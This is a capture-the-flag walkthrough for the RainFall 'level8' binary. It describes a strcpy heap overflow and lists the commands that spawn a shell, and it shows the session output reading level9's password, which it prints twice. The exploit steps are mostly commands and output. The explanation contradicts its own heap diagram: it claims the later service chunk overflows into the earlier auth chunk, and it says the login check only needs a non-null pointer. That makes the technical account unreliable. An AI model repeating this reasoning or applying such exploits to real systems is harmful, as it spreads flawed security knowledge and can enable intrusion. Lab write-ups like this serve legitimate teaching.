# Level8 Walkthrough - Heap Overflow Exploit

## 🎯 Goal
Exploit a heap overflow vulnerability to gain a shell and read the password for **level9**.

---

## 🔍 Program Analysis

The program is an interactive shell that accepts four commands:

1. **auth [name]**  
   - Allocates 4 bytes on the heap  
   - Stores pointer at `0x8049aac`

2. **reset**  
   - Frees the auth allocation

3. **service [name]**  
   - Allocates 4 bytes on the heap  
   - Stores pointer at `0x8049ab0`  
   - Uses `strcpy()` (⚠ no bounds checking)

4. **login**  
   - If both `auth` and `service` exist → calls `system("/bin/sh")`

---

## ⚠️ Key Vulnerability

- The **`service`** command uses `strcpy()` without bounds checking.  
- Heap chunks are allocated **adjacent** to each other.  
- Overflowing the `service` chunk can corrupt the `auth` chunk.  

---

## 🚀 Exploit Strategy

### Step 1: Create Auth Structure
```bash
auth AAAA
```

- Creates a 4-byte **auth chunk** on the heap.  
- `auth` pointer now contains a valid address.  

---

### Step 2: Overflow Service Chunk
```bash
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

- Creates a **service chunk** adjacent to the auth chunk.  
- Long string **overflows** from service chunk into auth chunk.  
- Corrupts the `auth` structure in memory.  

---

### Step 3: Trigger Shell
```bash
login
```

- Program checks if `auth` pointer exists (it does, though corrupted).  
- Calls `system("/bin/sh")`.  
- We now have a shell.  

---

## 🔧 Technical Details

### Heap Layout

```
+-------------------+ 0x804a008  <- Auth chunk
| 0x41414141 (AAAA) |  <- Our auth data
+-------------------+ 0x804a00c
| Heap metadata     |  <- malloc headers
+-------------------+ 0x804a018  <- Service chunk
| AAAAAAAAAAAA...   |  <- Our long service string
| ...               |  <- Overflow continues into
| ...               |  <- adjacent memory
+-------------------+
```

### Why This Works
- **Heap Allocation**: `malloc(4)` creates adjacent 4-byte chunks.  
- **No Bounds Checking**: `strcpy()` copies unlimited data into service chunk.  
- **Heap Overflow**: Service data spills into the adjacent `auth` chunk.  
- **Memory Corruption**: `auth` structure is corrupted but pointer remains valid.  
- **Shell Access**: `login` command triggers `system("/bin/sh")`.  

---

## 🎯 Successful Exploit

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth aaa
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## 💡 Key Insights
- **Order Matters**: Create `auth` first, then `service` with overflow.  
- **Overflow Length**: ~64+ characters needed to reach adjacent chunk.  
- **Heap Behavior**: Adjacent allocations → exploitable overflow.  
- **Minimal Validation**: Program only checks if `auth` pointer is non-null.  

---

## 🎉 Success

Password for **level9**:
```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
